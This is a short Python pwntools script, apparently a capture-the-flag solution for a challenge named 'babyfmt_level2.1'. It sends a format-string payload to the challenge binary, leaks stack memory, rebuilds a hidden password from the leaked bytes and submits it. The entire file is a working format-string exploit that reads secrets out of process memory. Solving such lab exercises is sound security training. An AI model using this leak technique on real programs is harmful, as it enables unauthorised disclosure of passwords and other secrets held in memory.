from pwn import *

p = process("/challenge/babyfmt_level2.1")

payload = b"%18$lx%19$lx%20$lx%21$lx"

p.sendline(payload)
p.recvuntil(b"now call printf on your data!\n\n")
leak = bytes.fromhex(p.recvuntil(b"\n")[:-1].decode())
leak = leak[:leak.index(b"\x00")]

password = p64(unpack(leak[:8], 'all'), endian='big') + p64(unpack(leak[8:], 'all'), endian='big')[1:]
print(password)

print(p.recv())
p.sendline(password)
print(p.recv())

p.close()